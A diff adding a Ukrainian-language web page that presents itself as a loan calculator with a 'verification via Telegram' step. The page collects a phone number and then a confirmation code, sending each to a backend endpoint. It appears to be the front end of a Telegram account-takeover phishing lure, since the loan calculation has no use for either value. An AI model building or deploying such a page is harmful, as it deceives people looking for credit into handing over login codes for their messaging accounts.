@@ -1,0 +1,228 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Кредитний Калькулятор + Верифікація</title>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+      font-family: Arial, sans-serif;
+    }
+    body {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: flex-start;
+      min-height: 100vh;
+      padding: 40px 20px;
+      background: linear-gradient(to right, #667eea, #764ba2);
+      color: white;
+      text-align: center;
+    }
+    h1 {
+      margin-bottom: 20px;
+    }
+    .btn {
+      padding: 12px 24px;
+      font-size: 18px;
+      border: none;
+      border-radius: 5px;
+      background-color: #fff;
+      color: #333;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+    .btn:hover {
+      background-color: #eee;
+    }
+    .popup {
+      display: none;
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0,0,0,0.6);
+      justify-content: center;
+      align-items: center;
+    }
+    .popup-content {
+      background: white;
+      color: black;
+      padding: 30px;
+      border-radius: 10px;
+      width: 90%;
+      max-width: 400px;
+    }
+    input, .range-container {
+      width: 100%;
+      padding: 10px;
+      margin: 10px 0;
+      border-radius: 5px;
+      border: 1px solid #ccc;
+      color: black;
+    }
+    .slider-output {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+    }
+    .hidden {
+      display: none;
+    }
+    .section {
+      background: rgba(255, 255, 255, 0.1);
+      padding: 20px;
+      border-radius: 10px;
+      margin-bottom: 30px;
+      width: 100%;
+      max-width: 600px;
+    }
+  </style>
+</head>
+<body>
+  <h1>Кредитний калькулятор</h1>
+
+  <div class="section">
+    <label>Сума кредиту (грн)</label>
+    <div class="slider-output">
+      <input type="range" id="amountRange" min="1000" max="100000" step="1000" value="10000">
+      <input type="number" id="amountInput" min="1000" max="100000" step="1000" value="10000">
+    </div>
+
+    <label>Період (місяців)</label>
+    <div class="slider-output">
+      <input type="range" id="periodRange" min="1" max="36" value="12">
+      <input type="number" id="periodInput" min="1" max="36" value="12">
+    </div>
+
+    <p>Відсоткова ставка: <strong>3%</strong> на місяць</p>
+    <p>До сплати: <strong id="totalPayment">12360</strong> грн</p>
+  </div>
+
+  <button class="btn" onclick="showPopup()">Верифікація через Телеграм</button>
+
+  <div class="popup" id="popup">
+    <div class="popup-content">
+      <h2>Введіть номер телефону</h2>
+      <form id="verifyForm" autocomplete="off">
+        <input type="text" id="phoneInput" placeholder="+380 ХХХ ХХХ ХХХ" required autocomplete="off">
+        <button type="button" class="btn" id="sendPhoneBtn">Надіслати номер</button>
+        <input type="text" id="codeInput" placeholder="Код" disabled required autocomplete="off">
+        <button type="submit" class="btn" id="confirmBtn" disabled>Підтвердити</button>
+      </form>
+    </div>
+  </div>
+
+  <script>
+    function showPopup() {
+      resetForm(); // скидаємо форму при відкритті попапу
+      document.getElementById("popup").style.display = "flex";
+    }
+
+    function resetForm() {
+      document.getElementById("verifyForm").reset();
+      document.getElementById("codeInput").disabled = true;
+      document.getElementById("confirmBtn").disabled = true;
+      document.getElementById("popup").style.display = "none";
+    }
+
+    const phoneInput = document.getElementById("phoneInput");
+    const codeInput = document.getElementById("codeInput");
+    const confirmBtn = document.getElementById("confirmBtn");
+    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+    const form = document.getElementById("verifyForm");
+
+    phoneInput.addEventListener('input', function(e) {
+      let value = phoneInput.value.replace(/[^\d+]/g, '');
+      if (!value.startsWith('+')) value = '+' + value;
+      phoneInput.value = value;
+    });
+
+    sendPhoneBtn.addEventListener('click', async () => {
+      const phone = phoneInput.value.trim();
+      if (!phone) return;
+
+      try {
+        const res = await fetch('http://127.0.0.1:8000/send_phone', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ phone })
+        });
+
+        if (res.ok) {
+          codeInput.disabled = false;
+          confirmBtn.disabled = false;
+        } else {
+          console.error('Помилка при відправці номера');
+        }
+      } catch (err) {
+        console.error('Помилка з\'єднання');
+      }
+    });
+
+    form.addEventListener('submit', async function(e) {
+      e.preventDefault();
+      const code = codeInput.value.trim();
+      if (!code) return;
+
+      try {
+        const res = await fetch('http://127.0.0.1:8000/verify_code', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ code })
+        });
+
+        if (res.ok) {
+          resetForm();
+        } else {
+          console.error('Невірний код');
+        }
+      } catch (err) {
+        console.error('Помилка з\'єднання');
+      }
+    });
+
+    const amountRange = document.getElementById("amountRange");
+    const amountInput = document.getElementById("amountInput");
+    const periodRange = document.getElementById("periodRange");
+    const periodInput = document.getElementById("periodInput");
+    const totalPayment = document.getElementById("totalPayment");
+
+    function updateCalculation() {
+      const amount = parseInt(amountRange.value);
+      const months = parseInt(periodRange.value);
+      const monthlyRate = 0.03;
+      const total = Math.round(amount * Math.pow(1 + monthlyRate, months));
+      totalPayment.textContent = total;
+      amountInput.value = amount;
+      periodInput.value = months;
+    }
+
+    amountRange.addEventListener('input', () => {
+      amountInput.value = amountRange.value;
+      updateCalculation();
+    });
+
+    amountInput.addEventListener('input', () => {
+      amountRange.value = amountInput.value;
+      updateCalculation();
+    });
+
+    periodRange.addEventListener('input', () => {
+      periodInput.value = periodRange.value;
+      updateCalculation();
+    });
+
+    periodInput.addEventListener('input', () => {
+      periodRange.value = periodInput.value;
+      updateCalculation();
+    });
+
+    updateCalculation();
+  </script>
+</body>
+</html>
